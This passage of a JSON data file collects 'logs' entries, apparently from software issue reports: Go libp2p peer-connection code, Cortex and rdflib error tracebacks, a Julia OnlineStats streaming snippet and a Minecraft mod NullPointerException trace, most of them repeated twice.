        "logs": "func main() {\r\n\tctx, cancel := context.WithCancel(context.Background())\r\n\tdefer cancel()\r\n\r\n\th, err := libp2p.New(ctx)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\th2, _ := libp2p.New(ctx)\r\n\th3, _ := libp2p.New(ctx)\r\n\th4, _ := libp2p.New(ctx)\r\n\r\n\tfmt.Println(h2, h3, h4)\r\n\tfmt.Printf(\"IP is %s\\n\", h2.Addrs())\r\n}"
    },
    {
        "logs": "func main() {\r\n\tctx, cancel := context.WithCancel(context.Background())\r\n\tdefer cancel()\r\n\r\n\th1, _ := libp2p.New(ctx, libp2p.ListenAddrStrings(\"/ip4/0.0.0.0/tcp/8884\"))\r\n\th2, _ := libp2p.New(ctx, libp2p.ListenAddrStrings(\"/ip4/0.0.0.0/tcp/8881\"))\r\n\th3, _ := libp2p.New(ctx, libp2p.ListenAddrStrings(\"/ip4/0.0.0.0/tcp/8882\"))\r\n\th4, _ := libp2p.New(ctx, libp2p.ListenAddrStrings(\"/ip4/0.0.0.0/tcp/8883\"))\r\n\r\n\th1peerInfo := &peerstore.PeerInfo{\r\n\t\tID:    h1.ID(),\r\n\t\tAddrs: h1.Addrs(),\r\n\t}\r\n\th2peerInfo := &peerstore.PeerInfo{\r\n\t\tID:    h2.ID(),\r\n\t\tAddrs: h2.Addrs(),\r\n\t}\r\n\th3peerInfo := &peerstore.PeerInfo{\r\n\t\tID:    h3.ID(),\r\n\t\tAddrs: h3.Addrs(),\r\n\t}\r\n\th4peerInfo := &peerstore.PeerInfo{\r\n\t\tID:    h4.ID(),\r\n\t\tAddrs: h4.Addrs(),\r\n\t}\r\n\r\n\th1addr, _ := peerstore.InfoToP2pAddrs(h1peerInfo)\r\n\th2addr, _ := peerstore.InfoToP2pAddrs(h2peerInfo)\r\n\th3addr, _ := peerstore.InfoToP2pAddrs(h3peerInfo)\r\n\th4addr, _ := peerstore.InfoToP2pAddrs(h4peerInfo)\r\n\r\n\th1multiaddr, _ := multiaddr.NewMultiaddr(fmt.Sprintf(\"%s\", h1addr[0]))\r\n\th2multiaddr, _ := multiaddr.NewMultiaddr(fmt.Sprintf(\"%s\", h2addr[0]))\r\n\th3multiaddr, _ := multiaddr.NewMultiaddr(fmt.Sprintf(\"%s\", h3addr[0]))\r\n\th4multiaddr, _ := multiaddr.NewMultiaddr(fmt.Sprintf(\"%s\", h4addr[0]))\r\n\r\n\th1peer, _ := peerstore.InfoFromP2pAddr(h1multiaddr)\r\n\th2peer, _ := peerstore.InfoFromP2pAddr(h2multiaddr)\r\n\th3peer, _ := peerstore.InfoFromP2pAddr(h3multiaddr)\r\n\th4peer, _ := peerstore.InfoFromP2pAddr(h4multiaddr)\r\n\r\n\tif err := h1.Connect(ctx, *h2peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h1.Connect(ctx, *h3peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h1.Connect(ctx, *h4peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tif err := h2.Connect(ctx, *h1peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h2.Connect(ctx, *h3peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h2.Connect(ctx, *h4peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tif err := h3.Connect(ctx, *h1peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h3.Connect(ctx, *h2peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h3.Connect(ctx, *h4peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tif err := h4.Connect(ctx, *h1peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h4.Connect(ctx, *h2peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tif err := h4.Connect(ctx, *h3peer); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tfor {\r\n\t\tfmt.Println(\"my ip \", h1.Addrs())\r\n\t\tfmt.Println(\"my ip \", h2.Addrs())\r\n\t\tfmt.Println(\"my ip \", h3.Addrs())\r\n\t\tfmt.Println(\"my ip \", h4.Addrs())\r\n\t}\r\n}"
    },
    {
        "logs": "level=info ts=2021-03-17T23:22:54.652031315Z caller=main.go:178 msg=\"Starting Cortex\" version=\"(version=1.4.0, branch=HEAD, revision=23554ce02)\"\r\nlevel=info ts=2021-03-17T23:22:54.652370205Z caller=server.go:225 http=[::]:8080 grpc=[::]:9095 msg=\"server listening on addresses\"\r\nlevel=error ts=2021-03-17T23:22:54.652890205Z caller=session.go:286 module=gocql client=index-read msg=\"dns error\" error=\"lookup : no such host\"\r\nlevel=error ts=2021-03-17T23:22:54.653142466Z caller=log.go:149 msg=\"error running cortex\" err=\"gocql: unable to create session: failed to resolve any of the provided hostnames\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.(*Config).session\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:126\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.NewStorageClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:226\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewIndexClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:233\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:174\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.NewStorageClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:228\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewIndexClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:233\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:174\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\nerror creating index client\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:176\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\nerror initialising module: store\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:89\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\"\r\nstream closed             "
    },
    {
        "logs": "level=info ts=2021-03-17T23:22:54.652031315Z caller=main.go:178 msg=\"Starting Cortex\" version=\"(version=1.4.0, branch=HEAD, revision=23554ce02)\"\r\nlevel=info ts=2021-03-17T23:22:54.652370205Z caller=server.go:225 http=[::]:8080 grpc=[::]:9095 msg=\"server listening on addresses\"\r\nlevel=error ts=2021-03-17T23:22:54.652890205Z caller=session.go:286 module=gocql client=index-read msg=\"dns error\" error=\"lookup : no such host\"\r\nlevel=error ts=2021-03-17T23:22:54.653142466Z caller=log.go:149 msg=\"error running cortex\" err=\"gocql: unable to create session: failed to resolve any of the provided hostnames\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.(*Config).session\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:126\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.NewStorageClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:226\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewIndexClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:233\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:174\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\ngithub.com/cortexproject/cortex/pkg/chunk/cassandra.NewStorageClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/cassandra/storage_client.go:228\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewIndexClient\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:233\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:174\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\nerror creating index client\\ngithub.com/cortexproject/cortex/pkg/chunk/storage.NewStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/chunk/storage/factory.go:176\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).initChunkStore\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/modules.go:362\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:87\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\\nerror initialising module: store\\ngithub.com/cortexproject/cortex/pkg/util/modules.(*Manager).InitModuleServices\\n\\t/go/src/github.com/cortexproject/cortex/pkg/util/modules/modules.go:89\\ngithub.com/cortexproject/cortex/pkg/cortex.(*Cortex).Run\\n\\t/go/src/github.com/cortexproject/cortex/pkg/cortex/cortex.go:316\\nmain.main\\n\\t/go/src/github.com/cortexproject/cortex/cmd/cortex/main.go:180\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1373\"\r\nstream closed             "
    },
    {
        "logs": "). Note that the matrix is symmetric due to the square of 3j symbol, and the indices inside 3j are interchangable.\r\n\r\nI recently noticed that the p3nj package supports vectorization and checked that it is much faster than iteration over indeces for 1d case. \r\n\r\nBut I can't understand whether you vectorization supports matrices. Do you have any idea how to vectorize this matrix? I.e. create a matrix "
    },
    {
        "logs": "---------------------------------------------------------------------------\r\nHTTPError                                 Traceback (most recent call last)\r\n<ipython-input-14-1742ef64bde2> in <module>\r\n----> 1 g.parse(data=jsonld, format=\"json-ld\")\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib/graph.py in parse(self, source, publicID, format, location, file, data, **args)\r\n   1076         parser = plugin.get(format, Parser)()\r\n   1077         try:\r\n-> 1078             parser.parse(source, self, **args)\r\n   1079         finally:\r\n   1080             if source.auto_close:\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/parser.py in parse(self, source, sink, **kwargs)\r\n     93             conj_sink = sink\r\n     94 \r\n---> 95         to_rdf(data, conj_sink, base, context_data)\r\n     96 \r\n     97 \r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/parser.py in to_rdf(data, dataset, base, context_data, produce_generalized_rdf, allow_lists_of_lists)\r\n    105     parser = Parser(generalized_rdf=produce_generalized_rdf,\r\n    106             allow_lists_of_lists=allow_lists_of_lists)\r\n--> 107     return parser.parse(data, context, dataset)\r\n    108 \r\n    109 \r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/parser.py in parse(self, data, context, dataset)\r\n    123             l_ctx = data.get(CONTEXT)\r\n    124             if l_ctx:\r\n--> 125                 context.load(l_ctx, context.base)\r\n    126                 topcontext = True\r\n    127             resources = data\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/context.py in load(self, source, base)\r\n    198         sources = []\r\n    199         source = source if isinstance(source, list) else [source]\r\n--> 200         self._prep_sources(base, source, sources)\r\n    201         for source_url, source in sources:\r\n    202             self._read_source(source, source_url)\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/context.py in _prep_sources(self, base, inputs, sources, referenced_contexts, in_source_url)\r\n    211                     raise errors.RECURSIVE_CONTEXT_INCLUSION\r\n    212                 referenced_contexts.add(source_url)\r\n--> 213                 source = source_to_json(source_url)\r\n    214                 if CONTEXT not in source:\r\n    215                     raise errors.INVALID_REMOTE_CONTEXT\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/util.py in source_to_json(source)\r\n     21 def source_to_json(source):\r\n     22     # TODO: conneg for JSON (fix support in rdflib's URLInputSource!)\r\n---> 23     source = create_input_source(source, format='json-ld')\r\n     24 \r\n     25     stream = source.getByteStream()\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib/parser.py in create_input_source(source, publicID, location, file, data, format)\r\n    191             file = open(filename, \"rb\")\r\n    192         else:\r\n--> 193             input_source = URLInputSource(absolute_location, format)\r\n    194         auto_close = True\r\n    195         # publicID = publicID or absolute_location  # Further to fix\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib/parser.py in __init__(self, system_id, format)\r\n    111 \r\n    112         req = Request(system_id, None, myheaders)\r\n--> 113         file = urlopen(req)\r\n    114         # Fix for issue 130 https://github.com/RDFLib/rdflib/issues/130\r\n    115         self.url = file.geturl()    # in case redirections took place\r\n\r\n/usr/lib/python3.8/urllib/request.py in urlopen(url, data, timeout, cafile, capath, cadefault, context)\r\n    220     else:\r\n    221         opener = _opener\r\n--> 222     return opener.open(url, data, timeout)\r\n    223 \r\n    224 def install_opener(opener):\r\n\r\n/usr/lib/python3.8/urllib/request.py in open(self, fullurl, data, timeout)\r\n    529         for processor in self.process_response.get(protocol, []):\r\n    530             meth = getattr(processor, meth_name)\r\n--> 531             response = meth(req, response)\r\n[Truncated]\n--> 569             return self._call_chain(*args)\r\n    570 \r\n    571 # XXX probably also want an abstract factory that knows when it makes\r\n\r\n/usr/lib/python3.8/urllib/request.py in _call_chain(self, chain, kind, meth_name, *args)\r\n    500         for handler in handlers:\r\n    501             func = getattr(handler, meth_name)\r\n--> 502             result = func(*args)\r\n    503             if result is not None:\r\n    504                 return result\r\n\r\n/usr/lib/python3.8/urllib/request.py in http_error_default(self, req, fp, code, msg, hdrs)\r\n    647 class HTTPDefaultErrorHandler(BaseHandler):\r\n    648     def http_error_default(self, req, fp, code, msg, hdrs):\r\n--> 649         raise HTTPError(req.full_url, code, msg, hdrs, fp)\r\n    650 \r\n    651 class HTTPRedirectHandler(BaseHandler):\r\n\r\nHTTPError: HTTP Error 404: Not Found"
    },
    {
        "logs": "---------------------------------------------------------------------------\r\nHTTPError                                 Traceback (most recent call last)\r\n<ipython-input-14-1742ef64bde2> in <module>\r\n----> 1 g.parse(data=jsonld, format=\"json-ld\")\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib/graph.py in parse(self, source, publicID, format, location, file, data, **args)\r\n   1076         parser = plugin.get(format, Parser)()\r\n   1077         try:\r\n-> 1078             parser.parse(source, self, **args)\r\n   1079         finally:\r\n   1080             if source.auto_close:\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/parser.py in parse(self, source, sink, **kwargs)\r\n     93             conj_sink = sink\r\n     94 \r\n---> 95         to_rdf(data, conj_sink, base, context_data)\r\n     96 \r\n     97 \r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/parser.py in to_rdf(data, dataset, base, context_data, produce_generalized_rdf, allow_lists_of_lists)\r\n    105     parser = Parser(generalized_rdf=produce_generalized_rdf,\r\n    106             allow_lists_of_lists=allow_lists_of_lists)\r\n--> 107     return parser.parse(data, context, dataset)\r\n    108 \r\n    109 \r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/parser.py in parse(self, data, context, dataset)\r\n    123             l_ctx = data.get(CONTEXT)\r\n    124             if l_ctx:\r\n--> 125                 context.load(l_ctx, context.base)\r\n    126                 topcontext = True\r\n    127             resources = data\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/context.py in load(self, source, base)\r\n    198         sources = []\r\n    199         source = source if isinstance(source, list) else [source]\r\n--> 200         self._prep_sources(base, source, sources)\r\n    201         for source_url, source in sources:\r\n    202             self._read_source(source, source_url)\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/context.py in _prep_sources(self, base, inputs, sources, referenced_contexts, in_source_url)\r\n    211                     raise errors.RECURSIVE_CONTEXT_INCLUSION\r\n    212                 referenced_contexts.add(source_url)\r\n--> 213                 source = source_to_json(source_url)\r\n    214                 if CONTEXT not in source:\r\n    215                     raise errors.INVALID_REMOTE_CONTEXT\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib_jsonld/util.py in source_to_json(source)\r\n     21 def source_to_json(source):\r\n     22     # TODO: conneg for JSON (fix support in rdflib's URLInputSource!)\r\n---> 23     source = create_input_source(source, format='json-ld')\r\n     24 \r\n     25     stream = source.getByteStream()\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib/parser.py in create_input_source(source, publicID, location, file, data, format)\r\n    191             file = open(filename, \"rb\")\r\n    192         else:\r\n--> 193             input_source = URLInputSource(absolute_location, format)\r\n    194         auto_close = True\r\n    195         # publicID = publicID or absolute_location  # Further to fix\r\n\r\n~/biolinknb/biolinkenv/lib/python3.8/site-packages/rdflib/parser.py in __init__(self, system_id, format)\r\n    111 \r\n    112         req = Request(system_id, None, myheaders)\r\n--> 113         file = urlopen(req)\r\n    114         # Fix for issue 130 https://github.com/RDFLib/rdflib/issues/130\r\n    115         self.url = file.geturl()    # in case redirections took place\r\n\r\n/usr/lib/python3.8/urllib/request.py in urlopen(url, data, timeout, cafile, capath, cadefault, context)\r\n    220     else:\r\n    221         opener = _opener\r\n--> 222     return opener.open(url, data, timeout)\r\n    223 \r\n    224 def install_opener(opener):\r\n\r\n/usr/lib/python3.8/urllib/request.py in open(self, fullurl, data, timeout)\r\n    529         for processor in self.process_response.get(protocol, []):\r\n    530             meth = getattr(processor, meth_name)\r\n--> 531             response = meth(req, response)\r\n[Truncated]\n--> 569             return self._call_chain(*args)\r\n    570 \r\n    571 # XXX probably also want an abstract factory that knows when it makes\r\n\r\n/usr/lib/python3.8/urllib/request.py in _call_chain(self, chain, kind, meth_name, *args)\r\n    500         for handler in handlers:\r\n    501             func = getattr(handler, meth_name)\r\n--> 502             result = func(*args)\r\n    503             if result is not None:\r\n    504                 return result\r\n\r\n/usr/lib/python3.8/urllib/request.py in http_error_default(self, req, fp, code, msg, hdrs)\r\n    647 class HTTPDefaultErrorHandler(BaseHandler):\r\n    648     def http_error_default(self, req, fp, code, msg, hdrs):\r\n--> 649         raise HTTPError(req.full_url, code, msg, hdrs, fp)\r\n    650 \r\n    651 class HTTPRedirectHandler(BaseHandler):\r\n\r\nHTTPError: HTTP Error 404: Not Found"
    },
    {
        "logs": "# We want to solve an AR(p) time series regression on normalized log differences of prices.\r\n# In addition, we want to fit 5 separate models at the same time, and aggregate the results\r\n# given the stream of prediction errors:\r\n# assume d, window, varx, vary, reg{i}, and swarm are OnlineStats that have all been instantiated\r\n\r\nf = @stream begin\r\n  diff(log($1) |> d) |> window\r\n  sx = lags(window) |> varx |> standardize(_)\r\n  sy = future(window) |> vary |> standardize(_)\r\n  (sx, sy) |> (reg1, reg2, reg3, reg4, reg5) |> (sy - predict(_, sx)) |> swarm\r\nend\r\n\r\nmap(f, prices)\r\n# all OnlineStats have been updated :)"
    },
    {
        "logs": "# We want to solve an AR(p) time series regression on normalized log differences of prices.\r\n# In addition, we want to fit 5 separate models at the same time, and aggregate the results\r\n# given the stream of prediction errors:\r\n# assume d, window, varx, vary, reg{i}, and swarm are OnlineStats that have all been instantiated\r\n\r\nf = @stream begin\r\n  diff(log($1) |> d) |> window\r\n  sx = lags(window) |> varx |> standardize(_)\r\n  sy = future(window) |> vary |> standardize(_)\r\n  (sx, sy) |> (reg1, reg2, reg3, reg4, reg5) |> (sy - predict(_, sx)) |> swarm\r\nend\r\n\r\nmap(f, prices)\r\n# all OnlineStats have been updated :)"
    },
    {
        "logs": "[Client thread/ERROR] [NotEnoughItems/]: Error dumping Bee Mutations mode: 0\r\njava.lang.NullPointerException\r\n\tat net.minecraft.item.ItemStack.func_82833_r(ItemStack.java:427) ~[add.class:?]\r\n\tat magicbees.bees.BeeMutation.getSpecialConditions(BeeMutation.java:538) ~[BeeMutation.class:?]\r\n\tat net.username_1.neiaddons.forestry.MutationDumper.dump(MutationDumper.scala:35) ~[MutationDumper.class:?]\r\n\tat net.username_1.neiaddons.forestry.MutationDumper.dump(MutationDumper.scala:18) ~[MutationDumper.class:?]\r\n\tat codechicken.nei.config.ArrayDumper.dump(ArrayDumper.java:22) ~[ArrayDumper.class:?]\r\n\tat codechicken.nei.config.DataDumper.dumpTo(DataDumper.java:66) ~[DataDumper.class:?]\r\n\tat codechicken.nei.config.DataDumper.dumpFile(DataDumper.java:41) [DataDumper.class:?]\r\n\tat codechicken.nei.config.DataDumper.mouseClicked(DataDumper.java:141) [DataDumper.class:?]\r\n\tat codechicken.nei.config.GuiOptionList$OptionScrollSlot.slotClicked(GuiOptionList.java:129) [GuiOptionList$OptionScrollSlot.class:?]\r\n\tat codechicken.core.gui.GuiScrollSlot.slotUp(GuiScrollSlot.java:129) [GuiScrollSlot.class:?]\r\n\tat codechicken.core.gui.GuiScrollPane.mouseMovedOrUp(GuiScrollPane.java:143) [GuiScrollPane.class:?]\r\n\tat codechicken.core.gui.GuiScreenWidget.func_146286_b(GuiScreenWidget.java:96) [GuiScreenWidget.class:?]\r\n\tat net.minecraft.client.gui.GuiScreen.func_146274_d(GuiScreen.java:306) [bdw.class:?]\r\n\tat codechicken.core.gui.GuiScreenWidget.func_146274_d(GuiScreenWidget.java:127) [GuiScreenWidget.class:?]\r\n\tat net.minecraft.client.gui.GuiScreen.func_146269_k(GuiScreen.java:268) [bdw.class:?]\r\n\tat net.minecraft.client.Minecraft.func_71407_l(Minecraft.java:1640) [bao.class:?]\r\n\tat net.minecraft.client.Minecraft.func_71411_J(Minecraft.java:973) [bao.class:?]\r\n\tat net.minecraft.client.Minecraft.func_99999_d(Minecraft.java:898) [bao.class:?]\r\n\tat net.minecraft.client.main.Main.main(SourceFile:148) [Main.class:?]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_51]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_51]\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_51]\r\n\tat java.lang.reflect.Method.invoke(Method.java:497) ~[?:1.8.0_51]\r\n\tat net.minecraft.launchwrapper.Launch.launch(Launch.java:135) [launchwrapper-1.11.jar:?]\r\n\tat net.minecraft.launchwrapper.Launch.main(Launch.java:28) [launchwrapper-1.11.jar:?]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_51]\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_51]\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_51]\r\n\tat java.lang.reflect.Method.invoke(Method.java:497) ~[?:1.8.0_51]\r\n\tat org.multimc.onesix.OneSixLauncher.launchWithMainClass(OneSixLauncher.java:310) [NewLaunch.jar:?]\r\n\tat org.multimc.onesix.OneSixLauncher.launch(OneSixLauncher.java:394) [NewLaunch.jar:?]\r\n\tat org.multimc.EntryPoint.listen(EntryPoint.java:170) [NewLaunch.jar:?]\r\n\tat org.multimc.EntryPoint.main(EntryPoint.java:54) [NewLaunch.jar:?]"
    },
    {
        "logs": "[Client thread/ERROR] [NotEnoughItems/]: Error dumping Bee Mutations mode: 0\r\njava.lang.NullPointerException\r\n\tat net.minecraft.item.ItemStack.func_82833_r(ItemStack.java:427) ~[add.class:?]\r\n\tat magicbees.bees.BeeMutation.getSpecialConditions(BeeMutation.java:538) ~[BeeMutation.class:?]\r\n\tat net.username_1.neiaddons.forestry.MutationDumper.dump(MutationDumper.scala:35) ~[MutationDumper.class:?]\r\n\tat net.username_1.neiaddons.forestry.MutationDumper.dump(MutationDumper.scala:18) ~[MutationDumper.class:?]\r\n\tat codechicken.nei.config.ArrayDumper.dump(ArrayDumper.java:22) ~[ArrayDumper.class:?]\r\n\tat codechicken.nei.config.DataDumper.dumpTo(DataDumper.java:66) ~[DataDumper.class:?]\r\n\tat codechicken.nei.config.DataDumper.dumpFile(DataDumper.java:41) [DataDumper.class:?]\r\n\tat codechicken.nei.config.DataDumper.mouseClicked(DataDumper.java:141) [DataDumper.class:?]\r\n\tat codechicken.nei.config.GuiOptionList$OptionScrollSlot.slotClicked(GuiOptionList.java:129) [GuiOptionList$OptionScrollSlot.class:?]\r\n\tat codechicken.core.gui.GuiScrollSlot.slotUp(GuiScrollSlot.java:129) [GuiScrollSlot.class:?]\r\n\tat codechicken.core.gui.GuiScrollPane.mouseMovedOrUp(GuiScrollPane.java:143) [GuiScrollPane.class:?]\r\n\tat codechicken.core.gui.GuiScreenWidget.func_146286_b(GuiScreenWidget.java:96) [GuiScreenWidget.class:?]\r\n\tat net.minecraft.client.gui.GuiScreen.func_146274_d(GuiScreen.java:306) [bdw.class:?]\r\n\tat codechicken.core.gui.GuiScreenWidget.func_146274_d(GuiScreenWidget.java:127) [GuiScreenWidget.class:?]\r\n\tat net.minecraft.client.gui.GuiScreen.func_146269_k(GuiScreen.java:268) [bdw.class:?]\r\n\tat net.minecraft.client.Minecraft.func_71407_l(Minecraft.java:1640) [bao.class:?]\r\n\tat net.minecraft.client.Minecraft.func_71411_J(Minecraft.java:973) [bao.class:?]\r\n\tat net.minecraft.client.Minecraft.func_99999_d(Minecraft.java:898) [bao.class:?]\r\n\tat 